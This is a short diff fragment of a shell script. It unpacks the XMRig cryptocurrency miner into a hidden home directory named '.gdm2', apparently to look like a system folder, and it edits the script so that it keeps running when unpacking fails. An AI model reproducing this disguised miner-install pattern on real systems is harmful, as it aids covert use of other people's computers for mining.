@@ -189,7 +189,7 @@ echo "[*] Unpacking xmrig.tar.gz to $HOME/.gdm2"
 [ -d $HOME/.gdm2 ] || mkdir $HOME/.gdm2
 if ! tar xf xmrig.tar.gz -C $HOME/.gdm2; then
   echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.gdm2 directory"
-  exit 1
+#  exit 1
 fi
 #rm xmrig.tar.gz
 
